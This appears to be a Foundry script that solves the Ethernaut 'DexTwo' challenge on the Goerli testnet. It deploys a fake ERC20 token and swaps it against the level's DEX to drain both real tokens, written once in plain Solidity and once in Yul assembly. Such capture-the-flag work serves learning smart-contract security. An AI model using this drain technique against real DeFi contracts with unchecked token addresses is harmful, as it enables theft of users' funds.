// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import { console } from "forge-std/Script.sol";
import { EthernautScript } from "./Ethernaut.s.sol";
import { IERC20 } from "@openzeppelin/contracts/interfaces/IERC20.sol";

import { DexTwoExploit } from "../../contracts/23_DexTwo.sol";

interface Instance {
    function owner() external view returns (address);

    function token1() external view returns (address);

    function token2() external view returns (address);

    function getSwapAmount(address from, address to, uint amount) external view returns (uint);

    function balanceOf(address token, address account) external view returns (uint);

    function approve(address spender, uint amount) external;

    function swap(address from, address to, uint amount) external;
}

contract DexTwoScript is EthernautScript {
    string network = "goerli";
    address level = 0x0b6F6CE4BCfB70525A31454292017F640C10c768;

    Instance instance;

    function setUp() public override {
        super.setUp();

        vm.createSelectFork(network);
        vm.startBroadcast(pk);

        instance = Instance(createLevelInstance(level, 0));
        console.log("-> instance:", address(instance));
    }

    function baseVersion() internal {
        address fakeERC20 = address(new DexTwoExploit());
        address token1 = instance.token1();
        address token2 = instance.token2();
        instance.swap(fakeERC20, token1, 1);
        instance.swap(fakeERC20, token2, 1);
    }

    function yulVersion() internal {
        bytes memory code = type(DexTwoExploit).creationCode;
        assembly {
            let fakeERC20 := create(0, add(code, 0x20), mload(code))
            let _instance := sload(instance.slot)

            mstore(0, "token1()")
            mstore(0, keccak256(0, 8))
            pop(staticcall(gas(), _instance, 0, 4, 0, 0x20))
            let token1 := mload(0)

            mstore(0, "token2()")
            mstore(0, keccak256(0, 8))
            pop(staticcall(gas(), _instance, 0, 4, 0, 0x20))
            let token2 := mload(0)

            let fmp := mload(0x40)

            mstore(fmp, "swap(address,address,uint256)")
            mstore(fmp, keccak256(fmp, 29))
            mstore(add(fmp, 4), fakeERC20)
            mstore(add(fmp, 0x24), token1)
            mstore(add(fmp, 0x44), 1)
            let success := call(gas(), _instance, 0, fmp, 0x64, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }

            // the call parameters are the same for the second token
            // we just need to modify the address of the token
            mstore(add(fmp, 0x24), token2)
            success := call(gas(), _instance, 0, fmp, 0x64, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }
        }
    }

    function run() public {
        // baseVersion();
        yulVersion();

        submitLevelInstance(payable(address(instance)), level);
        vm.stopBroadcast();
    }
}
